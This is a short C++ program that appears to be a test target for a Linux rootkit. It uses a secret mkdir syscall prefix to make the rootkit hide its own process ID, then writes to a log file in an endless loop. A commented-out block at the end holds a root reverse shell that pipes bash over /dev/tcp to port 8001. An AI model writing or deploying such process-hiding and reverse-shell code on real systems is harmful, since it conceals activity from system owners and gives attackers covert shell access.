//this is the binary we want to hide.
#include <fstream>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "secrets.h"
#include <string>
#include <iostream>
#include <sstream>

using namespace std;

int hidepid(string path) {
	path = string(secret_api_hidepid) + path;
	return syscall(SYS_mkdir, path.c_str());
}

string getPID() {
	int pid = getpid();
	stringstream temp;
	temp << pid;
	return temp.str();
}

int main() {
	cout << hidepid(getPID()) << endl;
	while (true) {
		ofstream outfile("/var/log/foobar", ofstream::app);
		outfile << "foobar" << endl;
		outfile.close();
		sleep(1);
	}
}

/* Originally I was going to make this open a reverse shell, 
   but then we'd have to hide the reverse shell process too
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>
int main() {
	setreuid(0, 0);
	char* const args[4] = {
		"/bin/bash",
		"-c",
		"/bin/bash -i >& /dev/tcp/localhost/8001 0>&1",
		0
	};
	execve("/bin/bash", args, 0);
	return 0;
}*/
